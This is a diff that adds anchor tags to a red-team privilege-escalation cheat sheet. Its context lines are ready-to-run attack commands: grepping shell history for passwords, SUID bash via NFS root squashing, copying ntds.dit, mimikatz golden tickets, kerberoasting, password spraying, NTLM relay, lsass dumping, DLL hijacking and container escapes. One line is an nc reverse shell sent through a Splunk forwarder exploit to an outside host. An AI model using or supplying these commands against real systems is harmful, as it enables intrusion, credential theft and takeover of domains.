 Domain: No
@@ -2174,6 +2425,7 @@ Methods:
 
 locate \*.ovpn
 
+<!-- TOC --><a name="bash-history"></a>
 # Bash History
 
 Domain: No
@@ -2192,6 +2444,7 @@ Methods:
 >
 > cat \~/.bash_history \| grep -i passw
 
+<!-- TOC --><a name="package-capture"></a>
 # Package Capture
 
 Domain: No
@@ -2208,6 +2461,7 @@ locate:
 
 -   tcpdump -nt -r capture.pcap -A 2\>/dev/null \| grep -P \'pwd=\'
 
+<!-- TOC --><a name="nfs-root-squashing"></a>
 # NFS Root Squashing
 
 Domain: Yes
@@ -2232,6 +2486,7 @@ Methods:
 >
 > chmod +s bash
 
+<!-- TOC --><a name="abusing-access-control-list"></a>
 # Abusing Access Control List
 
 Domain: Yes
@@ -2262,6 +2517,7 @@ Methods:
 >
 > get-acl \$folder \| folder
 
+<!-- TOC --><a name="escalate-with-sebackupprivilege"></a>
 # Escalate With SeBackupPrivilege
 
 Domain: Yes
@@ -2281,6 +2537,7 @@ import-module .\\SeBackupPrivilegeCmdLets.dll
 Copy-FileSebackupPrivilege z:\\Windows\\NTDS\\ntds.dit
 C:\\temp\\ndts.dit
 
+<!-- TOC --><a name="escalate-with-seimpersonateprivilege"></a>
 # Escalate With SeImpersonatePrivilege
 
 Domain: Yes
@@ -2297,6 +2554,7 @@ https://github.com/dievus/printspoofer
 
 printspoofer.exe -i -c \"powershell -c whoami\"
 
+<!-- TOC --><a name="escalate-with-seloaddriverprivilege"></a>
 # Escalate With SeLoadDriverPrivilege
 
 Domain: Yes
@@ -2341,6 +2599,7 @@ C:\\test\\capcom.sys
 
 4\. in msf exec \`run\`
 
+<!-- TOC --><a name="escalate-with-forcechangepassword"></a>
 # Escalate With ForceChangePassword
 
 Domain: Yes
@@ -2361,6 +2620,7 @@ Set-DomainUserPassword -Identity user1 -verbose
 
 Enter-PSSession -ComputerName COMPUTERNAME -Credential ""
 
+<!-- TOC --><a name="escalate-with-genericwrite"></a>
 # Escalate With GenericWrite
 
 Domain: Yes
@@ -2386,6 +2646,7 @@ Set-DomainObject -Credential \$creds -Identity USER1 -SET
 
 .\\Rubeus.exe kerberoast /domain:\<DOMAIN\>
 
+<!-- TOC --><a name="abusing-gpo"></a>
 # Abusing GPO
 
 Domain: Yes
@@ -2403,6 +2664,7 @@ Methods:
 user Administrator Password!@\# /domain\" \--GPOName \"ADDITIONAL DC
 CONFIGURATION\"
 
+<!-- TOC --><a name="pass-the-ticket"></a>
 # Pass-the-Ticket
 
 Domain: Yes
@@ -2419,6 +2681,7 @@ Methods:
 
 2.klist
 
+<!-- TOC --><a name="golden-ticket"></a>
 # Golden Ticket
 
 Domain: Yes
@@ -2436,6 +2699,7 @@ Methods:
 2.mimikatz \# kerberos::golden /user:\<USER\> /domain:\</DOMAIN\>
 /sid:\<OBJECT SECURITY ID\> /rce:\<NTLM HASH\> /id:\<USER ID\>
 
+<!-- TOC --><a name="abusing-splunk-universal-forwarder"></a>
 # Abusing Splunk Universal Forwarder
 
 Domain: No
@@ -2453,6 +2717,7 @@ python PySplunkWhisperer2_remote.py \--lhost 10.10.10.5 \--host
 -c \"rm /tmp/luci11;mkfifo /tmp/luci11;cat /tmp/luci11\|/bin/sh -i
 2\>&1\|nc 10.10.10.5 5555 \>/tmp/luci11\"\'
 
+<!-- TOC --><a name="abusing-gdbus"></a>
 # Abusing Gdbus
 
 Domain: No
@@ -2469,6 +2734,7 @@ gdbus call \--system \--dest com.ubuntu.USBCreator \--object-path
 /com/ubuntu/USBCreator \--method com.ubuntu.USBCreator.Image
 /home/nadav/authorized_keys /root/.ssh/authorized_keys true
 
+<!-- TOC --><a name="abusing-trusted-dc"></a>
 # Abusing Trusted DC
 
 Domain: Yes
@@ -2494,6 +2760,7 @@ Methods:
 5.  proxychains evil-winrm -u Administrator -p \'pass dumped in step 4\'
     > -i 10.100.10.100 -P 6666
 
+<!-- TOC --><a name="ntlm-relay"></a>
 # NTLM Relay 
 
 Domain: Yes
@@ -2508,6 +2775,7 @@ responder -I eth1 -v
 
 ntlmrelayx.py ...
 
+<!-- TOC --><a name="exchange-relay"></a>
 # Exchange Relay 
 
 Domain: Yes
@@ -2522,6 +2790,7 @@ Methods:
 
 ./exchangeRelayx.py ...
 
+<!-- TOC --><a name="dumping-with-diskshadow"></a>
 # Dumping with diskshadow
 
 Domain: Yes
@@ -2546,6 +2815,7 @@ expose %0xprashant% z:p
 
 2\. exec with diskshadow /s priv.txt
 
+<!-- TOC --><a name="dumping-with-vssadmin"></a>
 # Dumping with vssadmin
 
 Domain: Yes
@@ -2569,6 +2839,7 @@ copy
 C:\\ShadowCopy./kerbrute_linux_amd64 passwordspray -d domain.local \--dc
 10.10.10.10 domain_users.txt Password123
 
+<!-- TOC --><a name="password-spraying"></a>
 # Password Spraying
 
 Domain: Yes
@@ -2584,6 +2855,7 @@ Methods:
 ./kerbrute_linux_amd64 passwordspray -d domain.local \--dc 10.10.10.10
 domain_users.txt Password123
 
+<!-- TOC --><a name="as-rep-roasting"></a>
 # AS-REP Roasting
 
 Domain: Yes
@@ -2598,6 +2870,7 @@ Methods:
 
 .\\Rubeus.exe asreproast
 
+<!-- TOC --><a name="kerberoasting"></a>
 # Kerberoasting
 
 Domain: Yes
@@ -2616,6 +2889,7 @@ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip
 crackmapexec ldap 10.0.2.11 -u \'username\' -p \'password\' \--kdcHost
 10.0.2.11 \--kerberoast output.txt
 
+<!-- TOC --><a name="dump-lsass-with-silentprocessexit"></a>
 # Dump lsass with SilentProcessExit
 
 Domain: No
@@ -2630,6 +2904,7 @@ Methods:
 
 1.  SilentProcessExit.exe pid
 
+<!-- TOC --><a name="lsass-shtinkering"></a>
 # Lsass Shtinkering
 
 Domain: No
@@ -2647,6 +2922,7 @@ Methods:
 
 2.  LSASS_Shtinkering.exe pid
 
+<!-- TOC --><a name="andrewspecial"></a>
 # AndrewSpecial
 
 Domain: No
@@ -2661,6 +2937,7 @@ Methods:
 
 -   AndrewSpecial.exe
 
+<!-- TOC --><a name="ccache-ticket-reuse-from-tmp"></a>
 # CCACHE ticket reuse from /tmp
 
 Domain: Yes
@@ -2677,6 +2954,7 @@ Methods:
 
 -   export KRB5CCNAME=/tmp/krb5cc_X
 
+<!-- TOC --><a name="ccache-ticket-reuse-from-keyring"></a>
 # CCACHE ticket reuse from keyring
 
 Domain: Yes
@@ -2693,6 +2971,7 @@ Methods:
 
 -   /tmp/tickey -i
 
+<!-- TOC --><a name="ccache-ticket-reuse-from-sssd-kcm"></a>
 # CCACHE ticket reuse from SSSD KCM
 
 Domain: Yes
@@ -2710,6 +2989,7 @@ Methods:
 -   python3 SSSDKCMExtractor.py \--database secrets.ldb \--key
     > secrets.mkey
 
+<!-- TOC --><a name="ccache-ticket-reuse-from-keytab"></a>
 # CCACHE ticket reuse from keytab
 
 Domain: Yes
@@ -2736,6 +3016,7 @@ Methods:
 
 -   ./bifrost -action dump -source keytab -path test
 
+<!-- TOC --><a name="ssh-forwarder"></a>
 # SSH Forwarder
 
 Domain: Yes
@@ -2774,6 +3055,7 @@ Methods:
 
 -   (EmPyre: stager/applescript) \> execute
 
+<!-- TOC --><a name="dll-search-order-hijacking"></a>
 # DLL Search Order Hijacking
 
 Domain: No
@@ -2790,6 +3072,7 @@ Methods:
 
 -   Brownie
 
+<!-- TOC --><a name="slui-file-handler-hijack-lpe"></a>
 # Slui File Handler Hijack LPE
 
 Domain: No
@@ -2806,6 +3089,7 @@ Methods:
 
 -   Slui.exe
 
+<!-- TOC --><a name="cdpsvc-dll-hijacking"></a>
 # CDPSvc DLL Hijacking
 
 Domain: No
@@ -2820,6 +3104,7 @@ Methods:
 
 -   Cdpsgshims.exe
 
+<!-- TOC --><a name="magnifyexe-dll-search-order-hijacking"></a>
 # Magnify.exe Dll Search Order Hijacking
 
 Domain: No
@@ -2843,6 +3128,7 @@ Methods:
 
 -   then payload dll will execute as SYSTEM access.
 
+<!-- TOC --><a name="cdpsvc-service"></a>
 # CdpSvc Service 
 
 Domain: No
@@ -2871,6 +3157,7 @@ Methods:
 
 -   cmd wil prompt up with nt authority\\system.
 
+<!-- TOC --><a name="hivenightmare"></a>
 # HiveNightmare
 
 Domain: Yes
@@ -2965,6 +3252,7 @@ Methods:
 
 -   ./launchd-portrep \'touch /tmp/exploit-success\'=
 
+<!-- TOC --><a name="abusing-with-filerestoreprivilege"></a>
 # Abusing with FileRestorePrivilege
 
 Domain: Y/N
@@ -2979,6 +3267,7 @@ Methods:
 
 -   poptoke.exe
 
+<!-- TOC --><a name="abusing-with-restoreandbackupprivileges"></a>
 # Abusing with RestoreAndBackupPrivileges
 
 Domain: Y/N
@@ -2993,6 +3282,7 @@ Methods:
 
 -   poptoke.exe
 
+<!-- TOC --><a name="abusing-with-shadowcopybackupprivilege"></a>
 # Abusing with ShadowCopyBackupPrivilege
 
 Domain: Y/N
@@ -3007,6 +3297,7 @@ Methods:
 
 -   poptoke.exe
 
+<!-- TOC --><a name="abusing-with-shadowcopy"></a>
 # Abusing with ShadowCopy
 
 Domain: Y/N
@@ -3021,6 +3312,7 @@ Methods:
 
 -   poptoke.exe
 
+<!-- TOC --><a name="dynamic-phishing"></a>
 # Dynamic Phishing
 
 Domain: Y/N
@@ -3037,6 +3329,7 @@ Methods:
 
 -   Python rootOS.py
 
+<!-- TOC --><a name="race-conditions"></a>
 # Race Conditions
 
 Domain: No
@@ -3054,6 +3347,7 @@ Methods:
 
 -   tempracer.exe C:\\ temp\\\*.bat
 
+<!-- TOC --><a name="abusing-usermode-helper-api"></a>
 # Abusing usermode helper API
 
 Domain: No
@@ -3084,6 +3378,7 @@ Methods:
 
 -   cat /o
 
+<!-- TOC --><a name="escape-only-with-cap_sys_admin-capability"></a>
 # Escape only with CAP_SYS_ADMIN capability
 
 Domain: No
@@ -3116,6 +3411,7 @@ Methods:
 
 -   cat /output
 
+<!-- TOC --><a name="abusing-exposed-host-directories"></a>
 # Abusing exposed host directories
 
 Domain: No
@@ -3139,6 +3435,7 @@ Methods:
 
 # 
 
+<!-- TOC --><a name="unix-wildcard"></a>
 # Unix Wildcard
 
 Domain: No
@@ -3153,6 +3450,7 @@ Methods:
 
 -   python wildpwn.py \--file /tmp/very_secret_file combined ./pwn_me/
 
+<!-- TOC --><a name="socket-command-injection"></a>
 # Socket Command Injection
 
 Domain: No
@@ -3168,6 +3466,7 @@ Methods:
 -   echo \"cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x
     > /tmp/bash;\" \| socat - UNIX-CLIENT:/tmp/socket_test.s
 
+<!-- TOC --><a name="logstash"></a>
 # Logstash
 
 Domain: No
@@ -3194,6 +3493,7 @@ interval =\> 120
 
 }
 
+<!-- TOC --><a name="usodllloader"></a>
 # UsoDllLoader
 
 Domain: No
@@ -3208,8 +3508,10 @@ Methods:
 
 -   UsoDllLoader.exe
 
+<!-- TOC --><a name="trend-chain-methods-for-privilege-escalation"></a>
 # Trend Chain Methods for Privilege Escalation 
 
+<!-- TOC --><a name="habanero-chilli"></a>
 # Habanero Chilli
 
 Domain: No
@@ -3224,6 +3526,7 @@ Methods:
 
 -   rundll32.exe C:\\Dumpert\\Outflank-Dumpert.dll,Dump
 
+<!-- TOC --><a name="padron-chilli"></a>
 # Padron Chilli
 
 Domain: Y/N
@@ -3240,6 +3543,7 @@ Methods:
 -   \#.\\inject.x64.exe \<Path to reflective dll:
     > .\\LsassDumpReflectiveDLL.dll\>
 
+<!-- TOC --><a name="jalapeno-chillies"></a>
 # Jalapeno Chillies
 
 Domain: Yes
@@ -3255,6 +3559,7 @@ Methods:
 
 -   NihilistGuy.exe
 
+<!-- TOC --><a name="pasilla-chili"></a>
 # Pasilla Chili
 
 Domain: Yes
@@ -3271,6 +3576,7 @@ Methods:
 
 -   Demo5.ps1
 
+<!-- TOC --><a name="finger-chilli"></a>
 # Finger Chilli
 
 Domain: No
@@ -3293,6 +3599,7 @@ Methods:
 
 -   Enjoy a shell as NT AUTHORITY\\SYSTEM.
 
+<!-- TOC --><a name="orange-cayenne"></a>
 # Orange Cayenne
 
 Domain: Yes
@@ -3309,6 +3616,7 @@ Methods:
 
 -   Demo1.ps1
 
+<!-- TOC --><a name="red-cayenne"></a>
 # Red Cayenne
 
 Domain: Yes
@@ -3325,6 +3633,7 @@ Methods:
 
 -   demo2.ps1
 
+<!-- TOC --><a name="birds-eye-chilli"></a>
 # Birds Eye Chilli
 
 Domain: Yes
@@ -3341,6 +3650,7 @@ Methods:
 
 -   Demo3.ps1
 
+<!-- TOC --><a name="scotch-bonnet"></a>
 # Scotch Bonnet
 
 Domain: Yes
@@ -3357,6 +3667,7 @@ Methods:
 
 -   Demo4.ps1
 
+<!-- TOC --><a name="lemon-habanero"></a>
 # Lemon Habanero
 
 Domain: No
@@ -3376,6 +3687,7 @@ Methods:
 
 -   ./ambient /bin/bash
 
+<!-- TOC --><a name="red-habanero"></a>
 # Red Habanero
 
 Domain: No
@@ -3390,6 +3702,7 @@ Methods:
 
 -   BypassRtlSetProcessIsCritical.exe pid
 
+<!-- TOC --><a name="ghost-pepper"></a>
 # Ghost Pepper
 
 Domain: No
@@ -3406,6 +3719,7 @@ Methods:
 
 -   .\\poc.ps1
 
+<!-- TOC --><a name="chocolate-scorpion-chilli"></a>
 # Chocolate Scorpion Chilli
 
 Domain: No
@@ -3422,6 +3736,7 @@ Methods:
 
 -   .\\poc.ps1
 
+<!-- TOC --><a name="carolina-reaper"></a>
 # Carolina Reaper
 
 Domain: Yes
@@ -3438,6 +3753,7 @@ Methods:
 
 -   Demo6.ps1
 
+<!-- TOC --><a name="the-intimidator-chilli"></a>
 # The Intimidator Chilli
 
 Domain: No
